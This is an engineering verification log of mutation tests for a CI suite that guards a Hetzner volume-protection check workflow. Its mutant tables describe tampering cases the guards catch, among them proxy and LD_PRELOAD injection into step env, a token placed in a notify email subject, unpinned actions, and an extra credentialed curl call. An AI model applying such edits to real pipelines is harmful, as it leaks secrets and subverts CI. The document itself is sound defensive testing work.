# Mutation proofs and RED evidence: feat-one-shot-10432-web1-workspaces-protection-check

Plan: `knowledge-base/project/plans/2026-11-10-infra-web1-workspaces-volume-protection-check-plan.md`. Every mutation below
ran on a COPY (`SOLE_COPY_DRIFT_WF=<copy>` for the workflow, a scratch copy for the suite, the evaluator or a document);
the real files were never mutated, and each copy was diffed against a pristine backup.

## Phase 1a: green refactor against the unchanged workflow

`bash plugins/soleur/test/sole-copy-drift-check.test.sh` at e7024c5ed4 (the workflow unchanged): `=== Results: 195/195
passed, 0 failed ===`, rc 0, `FLOOR=195`, `TABLE_ROWS=126`.

## Phase 1b: RED

1. Against the unchanged workflow the suite stops at the extractor floor (rc 2): `FATAL: job 'sole-copy-protection-check'
   lacks the matrix rows: strategy.matrix.include must carry the entries inngest and web1 (extractor floor; got null)`.
2. Per-row evidence, against a scaffold-only copy (today's job plus `name:`, `fail-fast: false` and the two include rows;
   every step unchanged): `=== Results: 207/250 passed, 43 failed ===`. All 126 pre-existing table rows stayed green (H3
   counted 157 executed rows = 126 + 31 new). Every one of the 31 new W and C rows failed; its first failure line:

| Row | First failure line (scaffold-only copy) |
|---|---|
| WV1 | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|live=true\|name=soleur-web-platform-data-luks\|tf_age_min=N\|v |
| WV2 | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|live=false\|name=soleur-web-platform-data-luks\|tf_age_min=N\| |
| WV3 | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|live=false\|name=soleur-web-platform-data-luks\|tf_age_min=N\| |
| WV3b | 89 min: got 'could-not-read', want 'lift-pending-apply' |
| WV4 | probe outputs: got 'verdict=could-not-read\|', want 'expected=false\|http=200\|live=false\|name=soleur-web-platform-data-luks\|tf_age_min=N\ |
| WV5 | probe outputs: got 'verdict=could-not-read\|', want 'expected=false\|http=200\|live=true\|name=soleur-web-platform-data-luks\|tf_age_min=N\| |
| WV6 | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|name=soleur-web-platform-data-luks\|tf_age_min=N\|verdict=volu |
| WV8 | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|name=soleur-web-platform-data-luks\|tf_age_min=N\|verdict=volu |
| WT1/soleur-alpha-store | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|live=true\|name=soleur-alpha-store\|tf_age_min=N\|verdict=matc |
| WT1/zz9-other-name | probe outputs: got 'verdict=could-not-read\|', want 'expected=true\|http=200\|live=true\|name=zz9-other-name\|tf_age_min=N\|verdict=matches- |
| WT3 | probe outputs: got 'verdict=could-not-read\|', want 'tf_age_min=N\|verdict=could-not-read\|' |
| WR1 | probe outputs: got 'expected=true\|http=200\|live=true\|name=soleur-inngest-redis-store-luks\|verdict=matches-declared\|volume_id=106903269\ |
| WF1 | title: got 'infra: the Inngest store volume protection check could not read Hetzner (name-unreadable)', want 'infra: web-1 workspaces volume |
| WF3 | state: got 'open', want 'closed' |
| WF12/lifted-outside-terraform | the web-1 body names the Inngest volume |
| WF12/volume-not-found | the web-1 body names the Inngest volume |
| WF12/no-token | the web-1 body names the Inngest volume |
| WF12/could-not-read | the web-1 body names the Inngest volume |
| WX5 | vnf title: got 'infra: the Inngest store volume protection check could not read Hetzner (name-unreadable)', want 'infra: web-1 workspaces vo |
| WX7 | title 1: got 'infra: the Inngest store volume protection check could not read Hetzner (name-unreadable)', want 'infra: the web-1 workspaces  |
| WX9 | title: got 'infra: the Inngest store volume protection check could not read Hetzner (name-unreadable)', want 'infra: the web-1 workspaces vo |
| WX16 | the slug names entry:verdict: got '0', want '1' |
| C1 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C2 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C3 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C4 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C5 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C6 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C8 | commits read path: got 'gh api commits path=inngest-redis-luks', want 'gh api commits path=workspaces-luks' |
| C9 | every Inngest issue is untouched: got '5', want '6' |
| C10 | the could-not-perform filer succeeded without a checkout: got 'failure', want 'success' |

   For the C rows the first line is the shared commits-path invariant (the hard-coded Inngest path on the web-1 leg); each
   row also failed on its own assertion: C1 and C2 on the web-1 leg's probe outputs, C3 `web1: own file 3 h old, other file
   5 min old -> files: got 'could-not-read'`, C4/C5/C6 on their positive control (the web-1 leg's clean run could not close
   its own seeded issues), C8 on the web-1 leg's probe outputs. The other reds of that run are the expected pre-implementation
   ones: S1/S2 control (`id-placement`: the probe's literal pin), S2 "a pin literal in the probe" (did not land), S0b and
   H11a/H11b (the evaluator is not strict yet), N1b (three literals), N1c/N3/H14/H15 (the ADR-119 addendum and the runbook
   6604 read-back section do not exist yet), H3 (TABLE_ROWS not raised yet).

## Phase 4.1: GREEN and timing

The final suite, on the same host as the Phase 0.6c baseline: `=== Results: 250/250 passed, 0 failed ===`, rc 0,
`FLOOR=250`, `TABLE_ROWS=157` (H3: 157 executed rows). Compare user+sys, not wall; the host was loaded throughout.

| Run | wall | user | sys | user+sys | load (1 min) |
| --- | --- | --- | --- | --- | --- |
| before (195 assertions, the unchanged suite at the merge base, this session) | 1m42.3s | 41.0 s | 32.8 s | 73.8 s | |
| after Phase 1a (195, per-entry machinery) | 1m30.2s | 36.5 s | 31.5 s | 68.0 s | |
| after, first green (250) | 1m42.3s | 44.3 s | 38.8 s | 83.1 s | about 7-20 |
| after, final (250, the two ratchet fixes below) | 1m47.3s | 47.3 s | 40.1 s | 87.4 s | 23.6 |

The `merge_group` run's per-suite time is added by ship.

## Phase 4.2: mutation proofs

Each mutant is a COPY: workflow mutants run the suite with `SOLE_COPY_DRIFT_WF=<copy>`, harness mutants run a copy of the
suite under a unique untracked name beside it (removed after the run), and the evaluator mutant runs a suite copy whose
`EXPRLIB` points at an evaluator copy. Every copy was generated by one script that asserts each edit lands exactly once,
and the final real files equal HEAD plus the two ratchet fixes. All runs are against the final suite text. Every row below
is KILLED (the named rows went RED; rc 1); no mutant survived.

| Guard / row | Edit | Named rows that must turn RED | Observed RED (summary) |
| --- | --- | --- | --- |
| G1 r1 | `cmd_run` ignores `entry`, loads the first row | every W row, C1-C6 | 219/250: every W row (WV1-WV8, WV3b, WT1, WT3, WR1, WF1, WF3, WF12, WX5, WX7, WX9), C1-C6, C8, C9, C10, H11d |
| G1 r3 | swap `volume_id` between the rows | V1, WV1, N1, N1c | 121/250: V1, WV1, N1, N1b, N1c, S1/S2 and most of the table |
| G1 r4 | `tf_commit` hard-codes `inngest-redis-luks.tf` | C3, the commits-path invariant | 222/250: C3 (and C1-C6, C8), every web-1 row via the commits-path invariant |
| G1 r5 | `clear` builds `TITLES` for both subjects | C4 | 198/250: C4, C6, WF3 and the Inngest clear rows (duplicate titles double-process) |
| G1 r7 | the two `web1:` case arms deleted | WF1, WF12, WX5 | 245/250: WF1, WF12, WX5, WF3 |
| G1 r8 | probe pin is a literal, not `$PIN` | S2/`id-placement`, WV1 | 225/250: S1, S2 (`id-placement:step:probe`), N1b, WV1 and the web-1 rows |
| G1 r10 | awk resource hard-codes `inngest_redis_luks` | WV1, WT1, WR1 | 227/250: WV1, WT1, WR1 and the web-1 rows, C1-C6 |
| G1 r11 | notify subject is the literal "Inngest store volume" | WF1 | 249/250: WF1 |
| G2 r1 | evaluator strict branch removed (`# strict-matrix` lines) | S0b, H11a | 247/250: S0b, H11a, H11b (the strip no longer lands) |
| G2 r2 | `check()` drops the `matrix` clause | H11b | 248/250: H11b, H11c |
| G2 r3 | `refs()` checks only the first `matrix.*` ref | H11c | 249/250: H11c |
| G3 r1 | web1 `volume_id` changed by one digit | N1c, WV1 | 228/250: N1c, WV1, S1/S2 and the web-1 rows |
| G3 r3 | a third `readonly VOLUME_ID_PIN=106903269` inside the job (`tf_commit`) | N1b, S2/`id-placement` | 247/250: N1b, S1, S2 |
| G3 r4 | both rows carry `106903269` | N1c, S2/`id-placement` | 223/250: N1c, S1, S2, the web-1 rows |
| harness | `use_entry web1` a no-op | the use_entry row, WF1, WX9 | 231/250: H13, N1c, WF1, WF12, WV1, WX5, WX7, WX9, C3-C6, C9 |
| harness | invariants stop reading `issues.json` for ids | H12 | 249/250: H12 |
| harness | gh stub serves one commits answer for every path | C3 | 234/250: C3, C1, C2, C8, the web-1 V/T rows |

Not executed here, by the plan's own split: G1 rows 2, 6 and 9 are in-process S2 mutants (the suite runs them on every
run, green in the final run); G3 row 2 (the addendum sentence moved outside its section) is H14, and the N3 command-line
mutants are H15. The must-PASS input, the include rows in swapped order, is C8: green in the final run.

The first battery was discarded and rerun: two ratchet fixes were written into the real suite while workflow mutants were
still reading it, and bash reads a script as it runs, so three of those runs died mid-file (rc 2). The rerun reads a frozen
copy of the final suite.

## Phase 4.3: one row block deleted

The `WV8` row line deleted on a suite copy (its helper stays; H rows reuse it): `=== Results: 248/249 passed, 1 failed ===`,
`FAIL: H3 executed 156 rows, declared TABLE_ROWS=157`, then the outer `FATAL: only 249 assertions ran; expected >= 250.`
(rc 1).

## Phase 3.4 / 4.6b: read-only checks

- The runbook 6604 read-back line, run once as written (`HCLOUD_TOKEN_READONLY` only): `protected`, rc 0.
- The `scheduled-terraform-drift` Sentry monitor, read through the runbook path in `cron-egress-blocked.md`
  (`sentry-monitors-audit.sh`, GETs only, report to scratch): listed, not muted, not disabled; Class A (cron detector with
  no routing workflow) is clean, and the drift monitor is not among the three declared-pending unrouted monitors. Its
  IaC route is `cron-monitor-alerts.tf` email to `issue_owners`, falling through to `ActiveMembers`. `SENTRY_ISSUE_RO_TOKEN`
  answers 403 on the monitors endpoint, as that runbook records.

## Phase 4.4-4.7: ratchets, workflow readers, lints

Ratchets (final tree): `fixture-dir-operand-assert` 71/71 rc 0; `guard-vacuity-floor` 32/32 rc 0; `grep-q-pipe-guard` rc 0
(after the fix above; the first run flagged the suite's piped `grep -q`); `alarm-issue-filing-guard` 8/8 rc 0;
`fixture-relative-assert` 61/63 rc 1. Its two reds are one PRE-EXISTING row: `scripts/ci-oracle-review.sh` has 13 live
sites against a baseline of 12. Neither that file nor the baseline is in this diff, and both are byte-identical between
the merge base and `origin/main`, so `main` reds the same way. The suite's own 4 rows that the first run added are gone
(h11_run is guarded). `lint-shell-capture-exit`: 0 new findings on the suite, token-drift and test-affected-paths.

Workflow readers: the census `git grep -l scheduled-terraform-drift -- '*.test.*' 'tests/'`, rerun at work time, has 18
test files (2 more than the plan's floor: `inngest-luks-wrong-volume-alert.test.sh`, `function-registry-count.test.ts`).
All rc 0: git-data-rung2-rehearsal 143, inngest-provision-rehearsal 91, inngest-luks-wrong-volume-alert 97,
c4-count-parity 13, heartbeat-reconcile-issue-step 142/142, terraform-drift-sentry-leg 24, terraform-drift-step-order 7/7,
token-drift-workflow-causes 402/402, cf-tunnel-liveness-gate-mutations 8, check-cloudflare-token-drift 98/98,
test-apply-github-infra-mint-shape 126, test-argv-bearer-sweep 832, test-git-data-wipe-wedge 19,
terraform-target-parity (bun) 400, and under vitest cron-terraform-drift 19, function-registry-count 13,
sentry-monitor-iac-parity 27.

YAML parse rc 0; `check-workflow-duplicate-keys` OK (114 files); actionlint the same 17 pre-existing findings before and
after, none in the job. Byte identity (Phase 4.8): the first half lists only the notify `subject:`/`body:` lines; the
second half compares 15 lines, 0 diff lines; the `TITLE_*` block against `use_entry inngest` diff is empty.
`lint-guard-contract.py` on the plan: 3 guard entries, rc 0. `git diff --name-only origin/main...HEAD`: no `.tf`,
cloud-init or user_data file.

## Review round 1 (2026-11-10, PR #12563, CTO rulings 20-27): code fix round

The rows above are the record of the first battery and stay as written. This section supersedes them where it says so.

Final suite: `=== Results: 257/257 passed, 0 failed ===`, rc 0, `FLOOR=257`, `TABLE_ROWS=149` (H3: 149 executed rows;
157 - 9 rows deleted by ruling 23 (WV3b, WT1, WF3, WX7, C1, C2, C8, C5 merged into C4) + M17). Wall 1m28.2s, user 36.7 s,
sys 34.7 s.

**Guard 2, renumbered to the plan's mutation matrix.** Row G2 r1 above (the evaluator's strict branch removed) is RETIRED:
ruling 21 deleted that branch, `gha-expr.py` equals `origin/main` byte for byte, and H11a and the S0b matrix clauses are
deleted with it. The old G2 r2 and G2 r3 are the plan's rows 1 and 2; row 3 is new.

Every mutant below is a COPY in an allocated sandbox (`scripts/soleur-sandbox.sh new`, with `knowledge-base/engineering`
copied in, because the sandbox excludes `knowledge-base/`): workflow mutants run the suite with
`SOLE_COPY_DRIFT_WF=<copy>`; harness mutants run a mutated copy of the suite. One script per kind asserts each edit lands
exactly once. Control: the unmutated sandbox run is 257/257, rc 0. Every row is KILLED (rc 1).

| Guard / row | Edit | Named rows that must turn RED | Observed RED |
| --- | --- | --- | --- |
| G2 r1 (plan) | `check()` drops the `matrix` clause | H11b | 255/257: H11b, H11c |
| G2 r2 (plan) | `refs()` checks only the first `matrix.*` ref of an expression | H11c | 256/257: H11c |
| G2 r3 (plan) | row selection loosened: zero or two matching rows take the first row | H11d | 256/257: H11d |
| R1 m1 | job `needs:` | S1 (`job-key:needs`) | 255/257: S1, S2/control |
| R1 m2 | job `defaults.run.shell` | S1 (`job-key:defaults`) | 254/257: S1, S2/control, S2/m2 (the in-process mutant is already present) |
| R1 m3 | workflow `defaults.run.shell` | S1 (`wf-key:defaults`) | 254/257: S1, S2/control, S2/m3 |
| R1 m4 | job `concurrency` that cancels | S1 (`job-key:concurrency`) | 254/257: S1, S2/control, S2/m4 |
| R1 m5 | `shell:` on the finding filer | S1 (`step-key:file_finding:shell`) | 254/257: S1, S2/control, S2/m5 |
| R1 m12 | `runs-on: [self-hosted]` | S1 (`job-runs-on`) | 255/257: S1, S2/control |
| R1 m13 | checkout `ref:` | S1 (`checkout-with`) | 255/257: S1, S2/control |
| R3 a | the inngest `volume-not-found` DECISION set to the web-1 one | X5 (decision line), F12 | 253/257: X5 ("the decision line, exactly", "names nothing of the other entry"), F12 x3 |
| R3 b | the web1 `volume-not-found` DECISION set to the ADR-282 one | WX5, WF12 | 255/257: WX5 (both checks), WF12/volume-not-found |
| R3 c | web-1 words in the inngest `volume-not-found` LEAD | X5 (lead line), F12 | 253/257: X5 ("the lead line, exactly", "names nothing of the other entry"), F12 x3 |
| R9 (M17) | the probe's `jq -s` and one-document check reverted to `origin/main` | M17 | 256/257: M17 (two concatenated documents read as matches-declared) |
| ruling 26 a | `entry=` dropped from the probe's finish echo | the per-case entry invariant | 124/257, 166 "lacks ' entry='" lines |
| ruling 26 b | `entry=` dropped from the gate's clean line | the per-case entry invariant | 220/257, 45 such lines |
| ruling 26 c | `entry=` dropped from the gate's `::error::` line | the per-case entry invariant | 136/257, 153 such lines |
| ruling 26 harness | the per-case entry invariant removed | H5 | 256/257: H5 (`_iv_noentry`, `_iv_otherentry`, `_iv_entrylate`) |
| ruling 20 / N4 | "dated re-protect follow-through issue" removed from the job comment | N4 | 255/257: N4; H17 (its `job-phrase-removed` copy cannot land on a file that already lacks the phrase) |
| N4 harness | the "forcing function is Guard B4" ban removed | H17 | 256/257: H17 (`job-says-guard-b4`, `adr-says-guard-b4`) |
| R4 / N1c | the file-wide read-only id check removed | H14 | 256/257: H14 (`verify-block-get-names-the-inngest-id`, `verify-block-expect-names-the-inngest-id`) |
| R7 / N3 | the argv-header spelling ban removed from `rb_line_ok` | H15 | 256/257: H15 (moved-H, --header, --header=, -HAuthorization, -H"Authorization, -sSH, -H "$HDR", --oauth2-bearer, vb-moved-H) |
| R7 / N3 | the Authorization count removed from `rb_line_ok` | H15 | 256/257: H15 (`second-authorization`, a `--proxy-header` outside the spelling ban; the first run of this mutant survived, so that row was added) |
| R7 / N3 | the verify block's line count no longer pinned to 4 | H15 | 256/257: H15 (`vb-line-deleted`) |

The H15 header mutants MOVE the header from curl's stdin config to its argument list, so the Authorization count stays 1
and only the spelling ban can catch them; the spelling-ban mutant above shows each of them surviving without it.

Ruling 27: the cross-entry ban (`web-1|ADR-119|6604|workspaces` on the Inngest texts, `inngest|ADR-282|6894` on the web-1
texts, case-insensitive) was checked against today's Inngest strings first: the final suite is green, so no Inngest
string matches it and nothing was narrowed or edited.

Lints (final tree): `check-workflow-duplicate-keys` OK (114 files); actionlint 17 findings, equal to `origin/main`'s 17;
shellcheck on the suite: 0 warning or error findings (as on `origin/main`); the note-level count (`-f gcc`) rises from 25 to 53
(SC2016 on the deliberate `$` literals of the mutant strings, SC2030/SC2031 on the subshell-isolated negative controls).
`guard-vacuity-floor` 32/32 rc 0; `fixture-dir-operand-assert` 71/71 rc 0; `fixture-relative-assert` 61/63 rc 1, the same
pre-existing `scripts/ci-oracle-review.sh` row (13 sites against a baseline of 12) and no row of this suite;
`token-drift-workflow-causes` 402/402 rc 0; `workspaces-luks.test.sh` 63/63 rc 0.

## Review round 2 (2026-11-10, PR #12563 at 5f4cff5590, ledger F1-F12 and W7, CTO ruling 28): fix round

The rows above stay as written. This section supersedes them where it says so.

Final suite: `=== Results: 278/278 passed, 0 failed ===`, rc 0, `FLOOR=278` (from 257), `TABLE_ROWS=149` (unchanged: no
case-table row was added or deleted). The 21 new assertions are S2 rows (17 job rows and 3 workflow-env rows) and H11e.
H5, H14, H15 and H17 each stay one assertion that has more cases.

**The structural fix.** Each deny-list of the first round is now an exact set or string taken from the current workflow.
The sets are the step sequence, each step's key set, `env` and whitespace-collapsed `if`, the workflow `env` names, the
checkout SHA (`re.fullmatch`, found by identity, so `checkout-count` counts every checkout) and the notify action and its
`with:` (W7). The expression context roots are pinned over the job `if`/`name` and every step's `if`/`name`/`env`/`with`. At run time the
harness now refuses an unmodelled context or action (rc 3) instead of treating it as null. `rb_line_ok` pins the exact
wrapper, the exact printf-to-stdin construct, a closed curl-argument grammar after it, the token-name count, the
Authorization count and a tail check. The read/write name is still banned. The argv-header spelling ban is gone.

Every mutant below is a COPY in the allocated sandbox `soleur-sbx.r2fix10432` (`knowledge-base/engineering` copied in).
Workflow mutants run the suite with `SOLE_COPY_DRIFT_WF=<copy>`, and suite mutants run a mutated copy
`plugins/soleur/test/zz-mut-<name>.test.sh`. The generator exits non-zero unless each edit lands exactly once in its
scope. Each run is PID 1 of its own namespace (`soleur-sandbox.sh run-isolated`). Control first: 278/278 rc 0, run
again 278/278 rc 0 after the last suite edit. On every workflow mutant, `S2/control` also fails (the unmutated-job
control now sees the violation). The matching `S2/r2 ...: mutation did not land` line is expected, because the copy
already carries the in-process mutant.

### Workflow mutants

| Ledger | Mutant (on a workflow copy) | Red, named | Result |
| --- | --- | --- | --- |
| F1 | an anonymous `someorg/someaction@v1` step before the probe | S1 `step-sequence`, `step-key:checkout:name`, `step-key-missing:checkout:*`; then FATAL `unmodelled action` | rc 2 |
| F1 | an extra `run: 'true'` step after the checkout | S1 `step-sequence`, `step-key:checkout:run`, ... | 135/278 |
| F1 | two steps swapped | S1 `step-sequence`; X19 | 275/278 |
| F1 | the checkout on `actions/checkout@v4` | S1 `checkout-uses`; FATAL `unmodelled action: actions/checkout@v4` | rc 2 |
| F1 | `if: false` on the checkout | S1 `step-key:checkout:if`, `step-if:checkout`, `expr-context:checkout.if:False` | rc 2 |
| F1 | a second checkout of another ref | S1 `step-sequence`, `checkout-count:2` | 275/278 |
| F2 | `runner.os` in the finding filer's `if` | S1 `step-if:file_finding`, `expr-context:file_finding.if:runner`; FATAL `unmodelled context: runner` | rc 2 |
| F2 | `runner.os` in the notify `if` | S1 `step-if:notify`, `expr-context:notify.if:runner` | rc 2 |
| F2 | `runner.os` in the Doppler CLI step's `if` | S1 `step-key:doppler_cli:if`, `step-if:doppler_cli`, `expr-context:doppler_cli.if:runner` | rc 2 |
| F2 | the probe's `TF_PATH` chosen by `runner.os` | S1 `expr-context:probe.env:runner` | rc 2 |
| F3 | `DOPPLER_API_HOST`, `HTTPS_PROXY`, `LD_PRELOAD` in the probe env (3 copies) | S1 `step-env:probe` | 275/278 each |
| F3 | `HTTPS_PROXY`, `CURL_CA_BUNDLE` in the workflow env (2 copies) | S1 `wf-env` | 275/278 each |
| W7 | a token in the email subject | S1 `notify-with` | 273/278 |
| F4 | the gate's lines print no `verdict=` | the per-case verdict-line count: 198 "the gate printed 0 verdict line(s), want 1" | 129/278 |
| F4 | the gate's clean line written `verdict:` | the same count, 45 lines | 241/278 |
| F4 | the probe's finish line removed | the same count, 149 "the probe printed 0 verdict line(s), want 1" | 162/278 |
| F9 | the gate's timeout raised to 5 | S1 `step-key:gate:timeout-minutes`, `job-timeout` | 275/278 |
| F6 | the Inngest filer body names the web-1 volume | F1, F12 x4, X5 ("names nothing of the other entry", `soleur-web-platform-data-luks` and `106443278` are in the ban) | 272/278 |
| ruling 28 | "Guard B4 is the forcing function" in the job comment | N4 | 276/278 |
| ruling 28 | the marker line moved into the drift-check job's comment | N4 (`lacks "sole-copy-check verdict=matches-declared entry=web1"`) | 276/278 |
| ruling 28 | a per-row forcing function naming B4 (observability C) | N4 | 276/278 |
| ruling 28 | "Re-evaluate by" added to the job comment | N4 | 276/278 |

The rc 2 rows also fail S1 by the named label first. The run then stops at the runtime refusal, so no Results line is
printed, and the suite's outer wrapper turns that into a FATAL.

On each N4 workflow copy, H17 also fails. The cause is that its own copy of the same mutant cannot land on a file that
already carries it.

### Suite mutants (a guard clause deleted)

| Ledger | Clause deleted | Red, named | Result |
| --- | --- | --- | --- |
| F1 | the step-sequence pin | S2 r2 (anonymous action, extra run step, swap) | 275/278 |
| F3 | the step-env pin | S2 BASH_ENV, S2 r2 DOPPLER_API_HOST, HTTPS_PROXY, LD_PRELOAD | 274/278 |
| F1 | the step-if pin | S2 filer loses `always()`, S2 probe back on the implicit `success()` | 276/278 |
| F2 | the run-time refusal of an unmodelled context | H11e | 277/278 |
| F1 | the run-time refusal of an unmodelled action | H11e | 277/278 |
| F1 | the checkout pin made a prefix match | S2 r2 the checkout on a mutable tag | 277/278 |
| F2 | the expression-context pin | S2 r2 x6 (`runner.os` x4, `vars`, `matrix['subject']`) | 272/278 |
| F3 | the workflow env back to a deny-list | S2 BASH_ENV, S2 r2 HTTPS_PROXY, CURL_CA_BUNDLE, LD_PRELOAD | 274/278 |
| W7 | the notify `with:` pin | S2 r2 a token in the email subject | 277/278 |
| F4 | the verdict-line counts | H5 (`_iv_noprobeline`, `_iv_nogateline`, `_iv_twogatelines`) | 277/278 |
| F1 | the checkout identity (`checkout-count`) | S2 r2 a second checkout of another ref | 277/278 |
| F9 | the step-bound sum clause | S2 r2 a step bound raised past the job cap | 277/278 |
| F7 | N1c's expect-404 clause | H14 `verify-block-404-get-names-the-pin` | 277/278 |
| F8 | `rb_line_ok`'s tail check | H15 `vb-jq-outside-the-wrapper`, `vb-jq-outside-single-quoted` | 277/278 |
| F8 | `rb_line_ok`'s curl grammar | H15 `H-from-a-variable` | 277/278 |
| F8 | `rb_line_ok`'s token-name count | H15 `kept-second-curl-user` (second pass, below) | 277/278 |
| F8 | `rb_line_ok`'s exact-wrapper prefix AND its tail check | H15 `wrapper-other-config`, `wrapper-exits-on-missing`, `vb-jq-*` (second pass) | 277/278 |
| ruling 28 | N4's pairing ban (`B4[^.]*forcing function`, either order) | H17 `job-per-row-forcing-function`, `adr-guard-b4-is-the-web-1-forcing-function` | 277/278 |
| ruling 28 | N4's "Re-evaluate by" ban | H17 `job-re-evaluate-by` | 277/278 |
| ruling 28 | N4's "never the Date shape" requirement | H17 `job-never-the-date-shape-removed` | 277/278 |
| ruling 28 | N4's marker requirement | H17 `adr-marker-removed`, `job-marker-removed`, `adr-marker-names-inngest`, ... | 277/278 |
| ruling 28 | N4's comment scope back to "every comment line before the job" | H17 `job-marker-in-the-drift-check-comment` | 277/278 |
| F6 | the derived other-entry name and id dropped from the ban | 278/278 alone (no current text names the other entry). Paired with the workflow copy whose Inngest body names web-1: 278/278 rc 0, so that mutant survives without the guard and the guard is what kills it (the workflow row above). | pair |

**`rb_line_ok`, first pass and second pass.** In the first battery, three clause deletions survived (278/278 rc 0): the
token-name count, the stdin-construct count and the exact-wrapper prefix. No H15 row isolated them. The second pass
settled each one:

- token-name count: H15 row `kept-second-curl-user` (a second `curl -u ":$HCLOUD_TOKEN_READONLY"` inside the wrapper) was
  added. Only the name count sees it.
- stdin-construct count: EQUIVALENT, so the clause was removed. Without the construct, the grammar sees the whole line,
  which cannot start with `--max-time`. A second copy of the construct is a fourth token name.
- exact-wrapper prefix: EQUIVALENT to the tail check, which strips that wrapper. On a line that does not start with the
  wrapper, the text after the first quote is the wrapper body, never a bare comment. Two H15 rows were added
  (`wrapper-other-config`, `-c prd` in place of `-c prd_terraform`; `wrapper-exits-on-missing`, the flag dropped). Deleting
  the prefix alone: 278/278 rc 0, the declared equivalence. Deleting the prefix and the tail check: 277/278, H15 names both
  rows.

Both equivalences are listed in the suite header. Second-pass control: 278/278 rc 0, run on the final suite. The
grammar and tail-check deletions were proven again on the final suite with the same named reds.

**F12 skipped.** The 6894 "Read-backs after `destroy`" line is read by a test. The suite's N1 reads every
`--only-secrets HCLOUD_TOKEN_READONLY` line of 6894. On a copy where that line is converted to the read-only
`--only-secrets` form, N1 goes red: 277/278, "the inngest row's volume_id='106903269' does not equal the suite's Inngest
id". Converting the line needs an N1 expect-404 exception like N1c's, so the line is untouched.

**F7.** The three literal copies of the web-1 id outside the addendum were removed: the 6604 note, the 6604 read-back
prose and the ADR-119 bump sentence. Each now points at the id that ADR-119's addendum of 2026-11-10 states. That makes
the ADR's N1c claim (one stated id, read from the section) true. The guard is H14's existing rows plus
`verify-block-404-get-names-the-pin`.

Lints and ratchets (final tree):

- `token-drift-workflow-causes` 402/402 rc 0.
- `workspaces-luks.test.sh` 63/63 rc 0 and `inngest-luks-sole-copy.test.sh` 89/89 rc 0.
- `deploy-arm.test.sh` 79/79 rc 0 and `workflow-run-deploy-invariants.test.sh` 82/82 rc 0. These are the readers of the
  postmerge SKILL.md.
- `check-workflow-duplicate-keys` OK (114 files).
- actionlint: 17 findings, equal to `origin/main`.
- shellcheck on the suite: 0 warning or error findings. Note-level count 63, up from 53, all SC2016 on the `$` literals
  of the new mutant strings.
- `guard-vacuity-floor` 32/32 rc 0 and `fixture-dir-operand-assert` 71/71 rc 0.
- `fixture-relative-assert` 61/63 rc 1. The failing row is the same pre-existing `scripts/ci-oracle-review.sh` one (13
  against a baseline of 12), not a row of this suite.
- `lint-guard-contract.py` on the plan rc 0.
- `gha-expr.py` byte-identical to `origin/main`.

## Verification-pass fixes (2026-11-10, PR #12563 at ac827785dc, ledger V1-V6)

Sandbox `/var/tmp/soleur-sbx.final10432v.MzVfoed6` (allocator; `knowledge-base/engineering` copied in from `git ls-files`,
`diff -rq` clean; removed afterwards). Every run is a full suite run as PID 1 of its own namespace (`soleur-sandbox.sh
run-isolated`) in a mini-root of its own (symlinks to the sandbox, real copies of the suite, `knowledge-base` and the one
changed file). Workflow mutants run with `SOLE_COPY_DRIFT_WF=<copy>`; document mutants replace the copy at the real path;
suite mutants replace the suite. The generator (`scratchpad/fv/gen.py`) exits unless each edit lands exactly once inside
its scope (one step, the job comment block, the ADR addendum, one runbook line); each copy was also checked with `diff`
(1 or 2 changed lines; 4 for the two-echo mutant) and re-parsed with `yaml.safe_load`.

Controls: the fixed suite, 284/284 rc 0 (twice: before and after the `_iv_forgedprobe` row below). The pre-fix suite and
runbook of ac827785dc with the same workflow, 278/278 rc 0.

### Workflow mutants (each red on a named assertion; each one SURVIVED the pre-fix suite, 278/278 rc 0)

| Ledger | Mutant (one changed line) | Fixed suite | Named red |
|---|---|---|---|
| V1 | probe `TF_PATH: ${{ github.repository == 'jikig-ai/soleur' && 'none.tf' \|\| matrix.tf_file }}` | 281/284 | S1 `step-env-value:probe:TF_PATH` |
| V1 | probe `TF_PATH: ${{ !matrix.entry == true && matrix.tf_file \|\| 'none.tf' }}` | 281/284 | S1 `step-env-value:probe:TF_PATH` |
| V1 | probe `TF_RESOURCE: ${{ github.run_id == '77' && matrix.tf_resource \|\| 'none' }}` | 281/284 | S1 `step-env-value:probe:TF_RESOURCE` |
| V1 | tf_commit `TF_PATH: ${{ github.repository == 'jikig-ai/soleur' && 'apps' \|\| matrix.tf_file }}` | 281/284 | S1 `step-env-value:tf_commit:TF_PATH` |
| V1 | workflow env `TERRAFORM_VERSION: "1.10.6"` | 281/284 | S1 `wf-env-value:TERRAFORM_VERSION` |
| V2 | checkout `actions/checkout@0000000000000000000000000000000000000001` | rc 2 after S1 | S1 `checkout-uses`, then the harness FATAL `unmodelled action` |
| V4 | probe echo `verdict=${v/unprotected-as-declared/matches-declared}` | 281/284 | V4, T2, WV4: "the probe's verdict line says verdict=matches-declared, the published verdict is 'unprotected-as-declared'" |
| V4 | the same in the probe echo and the gate's clean echo | 281/284 | V4, T2, WV4: the probe line and the gate line each named |
| V4 | gate clean arm `verdict=matches-declared` for all four clean verdicts | 274/284 | V3, V3b, V4, V5 ... (10 rows): "the gate's verdict line says verdict=matches-declared, the published verdict is 'lift-pending-apply'" (and `lift-not-applied`, `unprotected-as-declared`) |
| V5 | job comment `5 after it` -> `0 after it` | 282/284 | N4 `job: lacks "2 before the issue's date and 5 after it"` |
| V5 | job comment `(re-evaluate on 2026-12-01, a Date-shape probe)` inserted | 282/284 | N4 `job: re-evaluate on` |

The other red line in each workflow row is the in-process S2 table running on the mutated job (its control and the row
for the same edit report "mutation did not land"). For the V5 rows it is H17's copies, built from the mutated file, whose
anchor text is gone (`did-not-land`). Neither is the property assertion.

